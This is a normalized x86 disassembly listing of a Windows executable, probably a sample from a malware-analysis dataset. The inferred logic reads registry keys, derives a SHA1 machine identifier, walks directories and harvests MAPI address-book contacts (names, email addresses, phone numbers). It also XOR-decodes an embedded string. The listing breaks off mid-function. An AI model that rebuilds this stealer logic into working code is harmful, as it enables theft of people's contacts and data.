mov eax [ ecx ]
add eax edi
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0x10 ]
add eax edi
add ecx 0x20
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] ecx
call sub_4046cc
lea esi [ esp + 0x40 ]
mov [ esp + 0x28 ] eax
call sub_405d11
mov [ esp + 0x5c ] ebx
cmp [ esp + 0x10 ] ebx
jne r-xdata
push ebx
lea eax [ esp + 0x24 ]
push eax
push 0x4
pop edi
mov eax edi
lea ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] 0x77010101
call sub_4060be
push r--data
lea eax [ esp + 0x44 ]
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x44 ]
push eax
call sub_4025f0
push [ ebp + 0x8 ]
lea eax [ esp + 0x44 ]
push eax
call sub_4025f0
push [ esp + 0x10 ]
lea eax [ esp + 0x44 ]
push eax
call sub_4025f0
push [ esp + 0x14 ]
lea eax [ esp + 0x44 ]
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x24 ]
push eax
mov eax edi
lea ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x24 ]
push eax
mov eax edi
lea ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x24 ]
push eax
mov eax edi
lea ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x24 ] eax
push ebx
lea eax [ esp + 0x28 ]
push eax
mov eax edi
lea ecx [ esp + 0x48 ]
call sub_4060be
push ebx
lea eax [ esp + 0x24 ]
push eax
mov eax edi
lea ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x24 ]
push eax
mov eax edi
lea ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x44 ]
push eax
call sub_4025f0
mov eax [ esp + 0x44 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x44 ]
call sub_406173
push [ esp + 0x44 ]
mov esi [ esp + 0x2c ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x58 ]
push [ esp + 0x58 ]
call sub_40242d
or [ esp + 0x5c ] 0xffffffff
lea esi [ esp + 0x40 ]
call sub_405f2c
mov edi [ esp + 0x18 ]
cmp [ esp + 0x14 ] ebx
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x34 ]
or [ esp + 0x5c ] 0xffffffff
call sub_405f2c
jmp r-xdata
mov eax [ esp + 0x2c ]
mov eax [ eax ]
inc [ esp + 0xc ]
shr eax 0x1
cmp [ esp + 0xc ] eax
jb r-xdata
sub_40f507
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc6f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
lea esi [ esp + 0x18 ]
call sub_405d11
xor esi esi
mov [ esp + 0x34 ] esi
mov [ esp + 0xc ] esi
call sub_4046cc
cmp [ ebp + 0x8 ] esi
je r-xdata
or [ esp + 0x34 ] 0xffffffff
lea esi [ esp + 0x18 ]
call sub_405f2c
mov ecx [ esp + 0x2c ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push esi
push [ ebp + 0xc ]
mov ebx 0x80000001
push [ ebp + 0x8 ]
lea edi [ esp + 0x18 ]
push ebx
call sub_4068cf
test al al
je r-xdata
cmp [ esp + 0xc ] esi
jle r-xdata
push esi
push [ esp + 0x10 ]
lea esi [ esp + 0x20 ]
call sub_405f9d
test al al
je r-xdata
call sub_4046cc
mov esi [ esp + 0x18 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call sub_4068cf
test al al
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
mov eax [ rw-data ]
shr eax 0x2
xor edi edi
mov [ esp + 0x14 ] esi
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
test esi esi
je r-xdata
mov eax [ rw-data ]
inc edi
shr eax 0x2
cmp edi eax
jl r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x80 ]
call sub_40f297
pop ecx
pop ecx
push [ esi + 0x80 ]
call [ lstrlenW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
mov edx [ esi + 0x80 ]
mov eax [ esi + 0x80 ]
xor edx edx
mov [ eax + ecx * 2 ] dx
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x80 ]
call sub_40f297
pop ecx
pop ecx
inc ecx
add edx 0x2
cmp ecx eax
jb r-xdata
cmp [ edx ] 0x3f
je r-xdata
jmp r-xdata
sub_40f652
push ebp
mov ebp esp
sub esp 0x3c
and [ ebp - 0x8 ] 0x0
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
xor esi esi
mov [ rw-data ] eax
cmp eax esi
je r-xdata
xor al al
push 0xf0000000
push 0x1
push esi
push esi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] esi
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
shr eax 0x2
mov [ ebp - 0x10 ] esi
test eax eax
jle r-xdata
push esi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
push sub_4046cc
push sub_40f507
push 0x1
push 0x1
push r--data
call sub_4046cc
mov edx 0x80000001
mov ecx eax
call sub_4069e9
push rw-data
call sub_406650
mov al 0x1
jmp r-xdata
mov ebx [ wsprintfW@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
inc [ ebp - 0x10 ]
shr eax 0x2
cmp [ ebp - 0x10 ] eax
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push esi
push esi
push 0x8004
push [ ebp - 0x8 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x10 ]
mov edi [ eax + ecx * 4 ]
cmp edi esi
je r-xdata
push esi
push edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push edi
push [ ebp - 0xc ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x2
push [ ebp - 0xc ]
mov [ ebp - 0x14 ] 0x14
call [ CryptGetHashParam@IAT ]
test eax eax
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyHash@IAT ]
call sub_4046cc
cmp [ rw-data ] esi
jne r-xdata
push esi
call [ SetLastError@IAT ]
push 0x88
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax esi
je r-xdata
call sub_405c10
test al al
je r-xdata
push esi
call [ ExitProcess@IAT ]
mov esi eax
xor eax eax
mov [ esi + 0x80 ] edi
mov [ esi ] ax
mov [ ebp - 0x1 ] al
xor edi edi
mov al [ ebp + edi - 0x3c ]
add [ ebp - 0x1 ] al
movzx eax al
push eax
lea eax [ ebp - 0x28 ]
push r--data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
push esi
call [ lstrcatW@IAT ]
inc edi
cmp edi 0x14
jl r-xdata
movzx eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push r--data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
push esi
call [ lstrcatW@IAT ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x4
pop eax
mov ecx rw-data
mov [ ebp - 0x18 ] esi
call sub_4060be
xor esi esi
sub_40f84a
push ecx
push ebx
push 0x0
call [ CoInitialize@IAT ]
call sub_40f18a
call sub_40f652
push rw-data
mov bl al
call sub_406650
call [ CoUninitialize@IAT ]
mov al bl
pop ebx
pop ecx
retn
sub_40f875
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x664
push ebx
push esi
push edi
xor eax eax
mov esi 0x206
push esi
push eax
mov [ esp + 0x18 ] ax
lea eax [ esp + 0x1a ]
push eax
call sub_4130d0
add esp 0xc
xor eax eax
push esi
push eax
mov [ esp + 0x220 ] ax
lea eax [ esp + 0x222 ]
push eax
call sub_4130d0
mov ebx [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call ebx
mov esi [ lstrcatW@IAT ]
mov edi r--data
push edi
lea eax [ esp + 0x14 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0x14 ]
push eax
call esi
push edi
lea eax [ esp + 0x14 ]
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x21c ]
push eax
call esi
lea eax [ esp + 0x420 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ FindClose@IAT ]
xor edi edi
lea eax [ esp + 0x10 ]
push edi
push eax
lea eax [ esp + 0x428 ]
call sub_407e71
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
call sub_409545
test al al
je r-xdata
push edi
push edi
push edi
lea eax [ esp + 0x42c ]
push eax
lea eax [ esp + 0x228 ]
push eax
push 0x80cd9102
push 0x80cd9101
call sub_4046cc
push eax
call sub_40541b
call sub_4046cc
mov eax esi
call sub_401872
sub_40f997
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x660
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x10 ] ax
lea eax [ esp + 0x12 ]
push eax
call sub_4130d0
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0xc ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0xc ]
push eax
call esi
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
lea eax [ esp + 0x8 ]
test eax eax
je r-xdata
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_40f875
je r-xdata
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call edi
lea eax [ esp + 0x8 ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x210 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x464 ]
push eax
call esi
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x210 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x210 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x214 ]
push eax
lea eax [ esp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_40f875
add esp 0x10
test al al
je r-xdata
sub_40fae1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x664
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x18 ] ax
lea eax [ esp + 0x1a ]
push eax
call sub_4130d0
mov ebx rw-data
add esp 0xc
mov esi ebx
call sub_406c79
test al al
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax rw-data
call sub_406f26
lea edi [ esp + 0x10 ]
call sub_40956d
test al al
je r-xdata
mov edx rw-data
mov ecx ebx
call sub_406e3e
mov edi ebx
call sub_406db6
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_40f997
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x46c ]
push eax
call [ lstrcpyW@IAT ]
mov eax edi
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call [ FindFirstFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov edi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x46c ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x248 ]
push eax
call edi
test eax eax
je r-xdata
test [ esp + 0x218 ] 0x10
je r-xdata
push esi
call [ FindClose@IAT ]
lea eax [ esp + 0x218 ]
push eax
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x248 ]
push eax
call edi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x21c ]
push eax
lea eax [ esp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_40f997
add esp 0x10
test al al
je r-xdata
sub_40fc35
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41da96
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x10e4
call sub_419050
push ebx
push esi
xor ecx ecx
mov eax r--data
mov esi 0x820
push edi
mov [ esp + 0x20 ] esi
cmp ecx eax
je r-xdata
xor al al
jmp r-xdata
lea ecx [ esp + 0xb0 ]
push ecx
push r--data
push eax
push 0x80000002
lea edi [ esp + 0x30 ]
call sub_4068cf
test al al
jne r-xdata
mov ecx [ esp + 0x10f4 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea eax [ esp + 0x8d4 ]
push eax
lea eax [ esp + 0xb8 ]
push eax
call [ ExpandEnvironmentStringsW@IAT ]
push r--data
call sub_4046cc
lea ebx [ esp + 0x8d4 ]
mov ecx eax
call sub_4010c5
xor ebx ebx
cmp eax ebx
je r-xdata
push ebx
push ebx
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x28 ]
push ecx
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
lea edx [ esp + 0x54 ]
push edx
lea edx [ esp + 0x54 ]
push edx
push eax
call [ ecx + 0x64 ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
lea edx [ esp + 0x3c ]
push edx
push 0x10
push ebx
push [ esp + 0x64 ]
mov [ esp + 0x4c ] ebx
push [ esp + 0x64 ]
mov [ esp + 0x30 ] ebx
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ esp + 0x38 ] 0x4
je r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x14 ]
push edx
push 0x80100000
mov [ esp + 0x1c ] ebx
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x18 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
push ebx
lea edx [ esp + 0x90 ]
push edx
mov [ esp + 0x94 ] 0x8
mov [ esp + 0x98 ] 0xfff0102
mov [ esp + 0x9c ] 0x3001001f
mov [ esp + 0xa0 ] 0x3003001f
mov [ esp + 0xa4 ] 0x3a1c001f
mov [ esp + 0xa8 ] 0x3a59001f
mov [ esp + 0xac ] 0x3a5d001f
mov [ esp + 0xb0 ] 0x3a09001f
mov [ esp + 0xb4 ] 0x3a16001f
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push ebx
push ebx
push ebx
push eax
call [ ecx + 0x28 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x4c ]
push edx
push ebx
push eax
call [ ecx + 0x24 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x30 ]
push edx
push ebx
push [ esp + 0x54 ]
push eax
call [ ecx + 0x4c ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x2c ] ebx
call sub_405d11
mov [ esp + 0x10fc ] ebx
mov eax [ esp + 0x30 ]
mov [ esp + 0x28 ] ebx
cmp [ eax ] ebx
jbe r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x14 ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x18 ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
or [ esp + 0x10fc ] 0xffffffff
lea esi [ esp + 0x3c ]
call sub_405f2c
mov al 0x1
mov [ esp + 0x20 ] ebx
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x18 ]
lea esi [ esp + 0x58 ]
call sub_405d11
mov [ esp + 0x10fc ] 0x2
mov ecx esi
lea edx [ esp + 0x68 ]
call sub_40120a
test al al
je r-xdata
mov [ esp + 0x34 ] ebx
mov [ esp + 0x10fc ] 0x1
lea esi [ esp + 0x58 ]
call sub_405f2c
mov [ esp + 0x10fc ] bl
lea eax [ esp + 0x68 ]
push eax
call sub_40114f
inc [ esp + 0x28 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x28 ]
add [ esp + 0x20 ] 0xc
cmp ecx [ eax ]
jb r-xdata
mov esi [ esp + 0x5c ]
push ebx
lea eax [ esp + 0x28 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0x2c ] esi
call sub_4060be
push ebx
push [ esp + 0x5c ]
mov eax esi
lea ecx [ esp + 0x44 ]
call sub_4060be
inc [ esp + 0x2c ]
cmp [ esp + 0x2c ] 0x14
jge r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x744f0fd2
cmp eax 0x3003001f
je r-xdata
mov ecx [ esp + 0x20 ]
lea esi [ ecx + eax + 0x4 ]
lea eax [ esp + 0x68 ]
push eax
call sub_401108
mov [ esp + 0x10fc ] 0x1
mov [ esp + 0x24 ] ebx
cmp [ esi + 0x4 ] ebx
jbe r-xdata
push [ esp + 0x40 ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x3e8
push esi
call sub_403aef
push eax
push 0x80362001
push [ esp + 0x54 ]
push [ esp + 0x54 ]
call sub_40242d
lea esi [ esp + 0x3c ]
mov [ esp + 0x2c ] ebx
call sub_405f3e
mov eax [ esp + 0x30 ]
mov eax [ eax ]
dec eax
cmp [ esp + 0x28 ] eax
jb r-xdata
mov eax [ esi + 0x8 ]
add eax [ esp + 0x34 ]
mov edi [ eax + 0x8 ]
mov eax [ eax ]
cmp eax 0x3001001f
je r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x694fe652
jmp r-xdata
cmp eax 0x3a09001f
je r-xdata
mov ecx edi
lea edi [ esp + 0x6c ]
call sub_4011e8
push edi
call [ lstrlenW@IAT ]
push 0x7e44e652
jmp r-xdata
cmp eax 0x3a16001f
je r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x7e4611d2
jmp r-xdata
cmp eax 0x3a1c001f
je r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x7bbfe71c
jmp r-xdata
cmp eax 0x3a59001f
je r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x7844e566
jmp r-xdata
cmp eax 0x3a5d001f
jne r-xdata
inc [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
add [ esp + 0x34 ] 0x10
cmp eax [ esi + 0x4 ]
jb r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x6ca92c23
jmp r-xdata
sub_41007b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
cdq
sub eax edx
sar eax 0x1
push esi
xor esi esi
lea ecx [ eax - 0x1 ]
xor edx edx
cmp ecx esi
jle r-xdata
cmp [ edi + eax * 2 - 0x2 ] si
jne r-xdata
cmp [ edi + edx * 2 ] si
je r-xdata
cmp [ ebp + 0x8 ] esi
jle r-xdata
push edi
push [ ebp + 0xc ]
call [ lstrcpyW@IAT ]
jmp r-xdata
inc edx
cmp edx ecx
jl r-xdata
mov al 0x1
pop esi
leave
retn
movzx eax [ esi + edi ]
push eax
lea eax [ ebp - 0x8 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
call [ lstrcatW@IAT ]
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
sub_4100e6
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41d9d4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebx
push esi
push edi
push 0x1
push 0x1400
lea esi [ esp + 0x38 ]
call sub_405d65
xor edi edi
mov [ esp + 0x5c ] edi
push 0x1
push 0x1000
lea esi [ esp + 0x48 ]
call sub_405d65
mov [ esp + 0x5c ] 0x1
mov eax [ esp + 0x44 ]
mov [ esp + 0x10 ] eax
mov eax r--data
cmp [ ebp + 0xc ] edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp + 0xc ] eax
mov ebx [ esp + 0x40 ]
push ebx
push [ ebp + 0xc ]
lea edi [ esp + 0x18 ]
push [ ebp + 0x8 ]
push 0x80000001
call sub_4068cf
test al al
je r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] eax
cmp ecx eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push [ esp + 0x3c ]
call [ wsprintfW@IAT ]
add esp 0x10
mov edi [ esp + 0x10 ]
push 0x0
lea eax [ edi * 4 + 0x8 ]
push eax
lea esi [ esp + 0x28 ]
call sub_405d65
mov [ esp + 0x5c ] 0x2
lea eax [ ebx + 0x1 ]
mov [ esp + 0x1c ] eax
lea eax [ edi - 0x1 ]
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
xor ecx ecx
cmp eax ecx
je r-xdata
push [ esp + 0x20 ]
push edi
mov edi ebx
call sub_41007b
push [ esp + 0x28 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push [ esp + 0x48 ]
call [ wsprintfW@IAT ]
add esp 0x1c
lea edx [ esp + 0x10 ]
push edx
push 0x1
push ecx
push ecx
push ecx
push ecx
lea ecx [ esp + 0x30 ]
push ecx
call eax
test eax eax
je r-xdata
push 0x0
push [ esp + 0x34 ]
push rw-data
call sub_406135
mov [ esp + 0x5c ] 0x0
lea esi [ esp + 0x40 ]
call sub_405f2c
or [ esp + 0x5c ] 0xffffffff
lea esi [ esp + 0x30 ]
call sub_405f2c
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0x20 ]
mov edi [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_41007b
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push [ esp + 0x4c ]
call [ wsprintfW@IAT ]
add esp 0x20
push [ esp + 0x14 ]
call [ LocalFree@IAT ]
jmp r-xdata
mov [ esp + 0x5c ] 0x1
lea esi [ esp + 0x20 ]
call sub_405f2c
jmp r-xdata
sub_410292
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
je r-xdata
xor bl bl
push esi
push sub_4100e6
push 0x1
push 0x1
push r--data
mov edx 0x80000001
mov ecx esi
call sub_4069e9
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov edi [ rw-data ]
push eax
push 0x0
push 0x3e8
push esi
mov ebx eax
call sub_403aef
push eax
push 0x80361901
push ebx
push edi
call sub_40242d
mov bl al
jmp r-xdata
push esi
call sub_40fc35
pop ecx
pop edi
pop esi
or al bl
pop ebx
pop ecx
retn
sub_4102fe
sub esp 0x420
push ebx
push ebp
xor ebp ebp
push esi
push edi
mov [ esp + 0x18 ] 0xb
mov [ esp + 0x1c ] ebp
mov [ esp + 0x2c ] ebp
mov [ esp + 0x14 ] ebp
mov ecx 0x400
lea eax [ esp + 0x30 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov esi [ lstrlenA@IAT ]
mov edi r--data
xor al al
mov ebx [ esp + 0x434 ]
push ebx
call esi
sub eax 0x3
cmp ebp eax
jae r-xdata
movsx eax [ ebx + ebp ]
push eax
push edi
call sub_414eb0
mov [ esp + 0x28 ] eax
movsx eax [ ebx + ebp + 0x1 ]
push eax
push edi
call sub_414eb0
add esp 0x10
cmp [ esp + 0x20 ] 0x0
mov [ esp + 0x28 ] eax
je r-xdata
test eax eax
je r-xdata
push eax
call esi
push edi
mov ebx eax
call esi
push [ esp + 0x20 ]
sub eax ebx
cdq
and edx 0xf
add eax edx
mov [ esp + 0x28 ] eax
sar [ esp + 0x28 ] 0x4
call esi
push edi
mov ebx eax
call esi
mov ecx eax
sub ecx ebx
shl ecx 0x2
or ecx [ esp + 0x24 ]
test ebp ebp
jne r-xdata
mov eax [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov [ esp + eax + 0x30 ] cl
lea eax [ ebp + 0x2 ]
cmp eax [ esp + 0x18 ]
ja r-xdata
mov eax 0x103
sub eax ecx
lea edx [ eax - 0x4 ]
mov [ esp + 0x1c ] edx
push 0x3
xor edx edx
mov [ esp + 0x1c ] eax
pop ebx
div ebx
add [ esp + 0x18 ] eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov eax [ esp + 0x434 ]
movsx eax [ eax + ebp + 0x2 ]
push eax
push edi
call sub_414eb0
pop ecx
pop ecx
mov [ esp + 0x20 ] eax
test eax eax
je r-xdata
mov eax 0x3ff
cmp [ esp + 0x1c ] eax
jb r-xdata
push eax
call esi
push edi
mov ebx eax
call esi
push [ esp + 0x28 ]
sub eax ebx
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ esp + 0x17 ] al
and [ esp + 0x17 ] 0xf
call esi
push edi
mov ebx eax
call esi
mov ecx [ esp + 0x14 ]
sub al bl
shl al 0x4
and al 0xf0
or al [ esp + 0x13 ]
inc [ esp + 0x14 ]
mov [ esp + ecx + 0x30 ] al
lea eax [ ebp + 0x3 ]
cmp eax [ esp + 0x18 ]
ja r-xdata
mov esi [ esp + 0x1c ]
xor eax eax
test esi esi
je r-xdata
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x434 ]
movsx eax [ eax + ebp + 0x3 ]
push eax
push edi
call sub_414eb0
pop ecx
pop ecx
mov [ esp + 0x28 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x438 ]
mov [ esi + eax ] 0x0
mov al 0x1
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea ecx [ esp + ecx + 0x2f ]
push [ esp + 0x20 ]
call esi
push edi
mov ebx eax
call esi
push [ esp + 0x28 ]
sub al bl
shl al 0x6
mov [ esp + 0x17 ] al
and [ esp + 0x17 ] 0xc0
call esi
push edi
mov ebx eax
call esi
mov ecx [ esp + 0x14 ]
sub al bl
and al 0x3f
or al [ esp + 0x13 ]
inc [ esp + 0x14 ]
add ebp 0x4
inc [ esp + 0x2c ]
mov [ esp + ecx + 0x30 ] al
cmp ebp [ esp + 0x18 ]
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x420
retn
mov dl [ ecx ]
mov edi [ esp + 0x438 ]
xor dl 0x5a
mov [ eax + edi ] dl
inc eax
dec ecx
cmp eax esi
jb r-xdata
cmp [ esp + 0x2c ] 0x64
ja r-xdata
sub_410522
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_41dc5d
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4a0
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov ecx [ esp + 0x4ac ]
pop edi
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push [ ebp + 0xc ]
call sub_4047b2
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
push ebx
push eax
call [ GetFileSize@IAT ]
mov esi eax
push 0x4
mov [ esp + 0x14 ] esi
pop edi
cmp esi ebx
jl r-xdata
mov [ esp + 0x10 ] ebx
cmp esi 0x6400000
jg r-xdata
push [ esp + 0x40 ]
call sub_405c44
push [ esp + 0x48 ]
call sub_405c44
push [ esp + 0x50 ]
